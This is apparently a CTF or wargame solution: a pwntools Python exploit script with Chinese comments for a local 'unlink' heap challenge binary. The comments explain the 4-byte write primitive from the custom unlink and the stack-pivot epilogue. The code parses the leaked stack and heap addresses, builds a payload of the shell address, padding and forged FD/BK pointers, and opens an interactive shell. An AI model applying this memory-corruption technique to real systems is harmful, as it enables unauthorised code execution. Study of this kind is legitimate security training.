#-*-coding:utf-8-*-
'''
总体思路:
这题棒极了,要考虑的方面很多
深入理解unlink攻击的本质是将偏移位置的内存改写,仅仅4字节(对于x86)(对amd64的话有8字节),DWORD SHOOT

注意到堆栈不可执行,
仅仅堆栈可以写入(.text段不可以写,所以不可能直接ret到shell(),因为会产生的副作用)

所以FD和BK一定只能在堆栈上

然后我们注意
.text:080485F2                 call    unlink
.text:080485F7                 add     esp, 10h
.text:080485FA                 mov     eax, 0
.text:080485FF                 mov     ecx, [ebp+var_4]
.text:08048602                 leave
.text:08048603                 lea     esp, [ecx-4]
.text:08048606                 retn
.text:08048606 main            endp

这里main的结尾没有leave+retn直接连起来,
而是lea esp ...

便有了通过retn=pop eip来跳到shell()的思路
副作用发生在没有多少软用的堆区

接下来开始rock
'''

from pwn import *
shell=0x080484EB
shell=p32(shell)
p=process("/home/unlink/unlink")
#context.log_level='debug'
info1=p.recvline()
info2=p.recvline()
print p.recv()
stackleak=info1.split("0x")[1].split('\n')[0]
heapleak=info2.split("0x")[1].split('\n')[0]
print "stackleak:",stackleak
print "heapleak:",heapleak
stackleak=int(stackleak,16)
heapleak=int(heapleak,16)
shoottarget=stackleak+16  #FD
'''
注意下,这里不是传统的chunk结构,是自己构造的,所以unlink改造的含义也改变了
这里FD偏移4的位置赋值BK的值,BK偏移0的位置,赋值FD的值,而不是链表里,偏移12和偏移8的位置发生改写
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;      BK=shoottarget
	BK->fd=FD;      FD=heapleak+12  意义就是shoottarget位置处被改写,副作用在heapleak+12处产生
}

每个chunk实际大小, ((申请16)+8-4)对齐8B,所以是24B

-----------
xxxxxxxxx    <-heapleak
------------
xxxxxxxxx
-------------
shelladdress
------------
0x41414141
-----------
0x41414141
-----------
0x41414141   这里本应该是0x00000019,但是因为不是实际链表,所以就无所谓,写成0x19后面会被截断
-----------
0x09171440  FD 改写成 shoottarget
-----------
0x09171410  BK 改写成 heapleak+8+4
-----------
'''
#payload=shell+"A"*12+p32(shoottarget)+p32(heapleak+12)   这种就写反了
payload=shell+"A"*12+p32(heapleak+12)+p32(shoottarget)   #只有这样才正确

print payload
print len(payload)
fp=open("key.txt","w")
fp.write(payload)
fp.close()
#gdb.attach(p)
p.recv(timeout=1)
p.sendline(payload)
p.interactive()
#gdb.attach(p)


'''
void *v4; // [sp+4h] [bp-14h]@1
_DWORD *v5; // [sp+8h] [bp-10h]@1
_DWORD *v6; // [sp+Ch] [bp-Ch]@1

'''
